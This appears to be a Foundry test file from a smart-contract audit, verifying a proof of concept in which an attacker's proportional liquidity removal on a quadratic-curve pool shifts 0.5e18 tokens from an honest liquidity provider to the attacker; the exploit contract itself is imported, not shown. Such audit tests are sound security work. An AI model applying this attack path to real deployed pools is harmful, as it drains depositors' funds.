// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./18433-removeliquidity-logic-is-not-correct-for-generalized-well-fu.sol";

contract RemoveLiquidityLinearityTest is Test {
    function test_proportionalRemove_onQuadraticWell_transfersValueBetweenLPs() public {
        Exploit exploit = new Exploit(); // this test contract is the "attacker" EOA
        MockToken token1 = exploit.token1();
        QuadraticWell qwell = exploit.qwell();
        Well well = exploit.well();
        HonestLp victim = exploit.victim();

        exploit.run();

        // Honest LP recovers less than deposited.
        assertEq(exploit.victimOut0(), 0.75e18, "victim token0 out");
        assertEq(exploit.victimOut1(), 0.5e18, "victim token1 out");
        assertLt(exploit.victimOut0(), exploit.victimDeposit0(), "victim lost token0");
        assertLt(exploit.victimOut1(), exploit.victimDeposit1(), "victim lost token1");

        // Attacker recovers more than deposited — exactly the victim's loss.
        assertEq(exploit.attackerOut0(), 2.25e18, "attacker token0 out");
        assertEq(exploit.attackerOut1(), 1.5e18, "attacker token1 out");
        uint256 t1Loss = exploit.victimDeposit1() - exploit.victimOut1();
        uint256 t1Gain = exploit.attackerOut1() - exploit.attackerDeposit1();
        assertEq(t1Gain, t1Loss, "token1 gain == loss");
        assertEq(t1Loss, 0.5e18, "token1 value transferred");

        // The Exploit retains 1.5e18 token1 (entered run() with 1e18) -> +0.5e18 net.
        assertEq(token1.balanceOf(address(exploit)), 1.5e18, "attacker retains extracted token1");
        assertEq(token1.balanceOf(address(exploit)) - exploit.attackerDeposit1(), 0.5e18, "net token1 profit");

        emit log_named_uint("victim token0 deposited", exploit.victimDeposit0());
        emit log_named_uint("victim token0 recovered", exploit.victimOut0());
        emit log_named_uint("victim token1 deposited", exploit.victimDeposit1());
        emit log_named_uint("victim token1 recovered", exploit.victimOut1());
        emit log_named_uint("attacker net token1 gain", token1.balanceOf(address(exploit)) - exploit.attackerDeposit1());
        // silence unused
        qwell;
        well;
        victim;
    }
}
